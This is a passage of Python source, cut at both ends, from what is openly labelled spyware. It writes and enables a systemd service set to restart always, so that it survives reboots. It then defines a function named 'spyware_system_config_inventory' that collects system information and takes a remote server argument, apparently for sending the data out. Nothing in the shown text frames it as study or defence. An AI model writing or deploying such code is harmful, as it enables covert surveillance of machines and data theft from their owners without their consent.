                f.write('ExecStart=/path/to/your/script.sh\n')
                f.write('Restart=always\n')
                f.write('\n')
                f.write('[Install]\n')
                f.write('WantedBy=multi-user.target\n')
            subprocess.run(['systemctl', 'daemon-reload'])
            subprocess.run(['systemctl', 'enable', 'configinventory'])
            subprocess.run(['systemctl', 'start', 'configinventory'])
        except Exception as e:
            print(f"Error creating Linux service: {e}")

def spyware_system_config_inventory(output_file: str, remote_server: str) -> None:
    system_info = collect_system_info()
    save_to_file(system_info, output_file)
